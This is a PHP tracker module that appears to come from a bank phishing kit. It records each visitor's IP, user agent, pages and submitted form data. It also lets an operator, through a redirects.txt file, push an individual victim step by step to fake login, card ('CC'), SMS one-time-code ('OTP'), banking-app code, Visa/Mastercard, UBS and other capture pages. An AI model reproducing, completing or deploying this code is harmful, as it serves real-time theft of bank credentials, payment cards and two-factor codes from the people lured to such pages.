<?php
// includes/tracker.php - DATABASE ONLY VERSION
require_once 'config.php';
require_once 'functions.php';
require_once 'performance_database.php';

// Initialize database
$db = PerformanceDatabase::getInstance();

/**
 * Track visitor - simplified database-only version
 */
function trackVisitor() {
    global $db;
    
    // Ensure data directory exists
    if (!file_exists(DATA_DIR)) {
        mkdir(DATA_DIR, 0755, true);
    }
    
    // Get or create visitor ID
    $visitorId = $_COOKIE['visitor_id'] ?? uniqid();
    
    if (!isset($_COOKIE['visitor_id'])) {
        setcookie('visitor_id', $visitorId, time() + 86400 * 30, '/');
    }
    
    // Prepare visitor data
    $visitor = [
        'id' => $visitorId,
        'ip' => getIpAddress(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'page' => $_SERVER['REQUEST_URI'],
        'page_name' => getFriendlyPageName($_SERVER['REQUEST_URI']),
        'timestamp' => time(),
        'date' => date('Y-m-d H:i:s'),
        'blocked' => !isIpAllowed(getIpAddress()),
    ];
    
    // Track visitor and update online status
    $db->trackVisitor($visitor);
    $db->updateOnlineStatus($visitorId);
    
    return $visitor;
}

/**
 * Get all visitors
 */
function getVisitors() {
    global $db;
    return $db->getVisitors();
}

/**
 * Get online visitors count
 */
function getOnlineVisitorsCount() {
    global $db;
    return $db->getOnlineCount();
}

/**
 * Check if visitor is online
 */
function isVisitorOnline($visitorId) {
    global $db;
    return $db->isVisitorOnline($visitorId);
}

/**
 * Update visitor's online status
 */
function updateOnlineStatus($visitorId) {
    global $db;
    $db->updateOnlineStatus($visitorId);
}

/**
 * Update visitor form data
 */
function updateVisitorFormData($visitorId, $formData) {
    global $db;
    
    $formData['timestamp'] = time();
    $formData['date'] = date('Y-m-d H:i:s');
    
    return $db->saveFormData($visitorId, $formData);
}

/**
 * Get visitor count
 */
function getVisitorCount() {
    global $db;
    return $db->getTotalVisitorCount();
}

/**
 * Count visitors from HTML (for backwards compatibility)
 */
function countVisitorsFromHtml() {
    global $db;
    return $db->getTotalVisitorCount();
}

/**
 * Check for redirect instructions
 */
function checkRedirectInstruction($visitorId) {
    $redirectFile = DATA_DIR . 'redirects.txt';
    
    if (!file_exists($redirectFile)) {
        return false;
    }
    
    $lines = file($redirectFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    
    foreach ($lines as $line) {
        $data = json_decode($line, true);
        if ($data && isset($data['visitor_id']) && $data['visitor_id'] === $visitorId) {
            
            // Handle custom page redirection with text
            if (isset($data['custom_text']) && !empty($data['custom_text'])) {
                $pages = [
                    'app3' => 'appcode.php?',
                    'app3e' => 'appcode.php?error&',
                ];
                
                if (isset($pages[$data['page']])) {
                    return $pages[$data['page']] . 'text=' . urlencode($data['custom_text']);
                }
            }
            
            // Handle regular page redirections
            $pages = [
		        'login' => 'login.php',
				'card' => 'payment.php',
				'card2' => 'payment.php?error',
				'sms' => 'sms.php',
				'sms2' => 'sms.php?error',
				'app' => 'app.php',
                'app2' => 'app.php?error',
                'app3' => 'appcode.php',
                'mas' => 'master.php',
                'vis' => 'visa.php',
                'load' => 'processing.php',
                'sb' => 'sbapp.php',
                'ubs' => 'ubs.php',
                'web' => sitexite(),
                'fin' => 'done.php',
            ];
            
            if (isset($pages[$data['page']])) {
                return $pages[$data['page']];
            }
        }
    }
    
    return false;
}

/**
 * Clear redirect instruction
 */
function clearRedirectInstruction($visitorId) {
    $redirectFile = DATA_DIR . 'redirects.txt';
    
    if (!file_exists($redirectFile)) {
        return;
    }
    
    $lines = file($redirectFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $newContent = '';
    
    foreach ($lines as $line) {
        $data = json_decode($line, true);
        if (!($data && isset($data['visitor_id']) && $data['visitor_id'] === $visitorId)) {
            $newContent .= $line . PHP_EOL;
        }
    }
    
    file_put_contents($redirectFile, $newContent, LOCK_EX);
}

/**
 * Utility Functions
 */
function getFriendlyPageName($path) {
    $filename = basename($path);
    if (strpos($filename, '?') !== false) {
        $filename = substr($filename, 0, strpos($filename, '?'));
    }
    
    $pageNames = [
        'processing.php' => 'Loading',
        'login.php' => 'Login',
        'payment.php' => 'CC',
        'sms.php' => 'OTP', 
        'app.php' => 'APP', 
        'appcode.php' => 'APP-Code', 
        'master.php' => 'APP-master',
        'visa.php' => 'APP-visa',
        'sbapp.php' => 'APP-SB',
        'ubs.php' => 'APP-UBS',
        'done.php' => 'Done',
    ];
    
    return $pageNames[$filename] ?? ucwords(str_replace(['-', '_', '.php'], [' ', ' ', ''], $filename));
}

function getIpAddress() {
    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function redirectVisitor($destination) {
    header("Location: $destination");
    exit;
}

/**
 * Get system info - always returns database
 */
function getSystemInfo() {
    return [
        'method' => 'database',
        'performance' => 'high',
        'database_file' => 'visitors.db',
        'cache_enabled' => true,
    ];
}
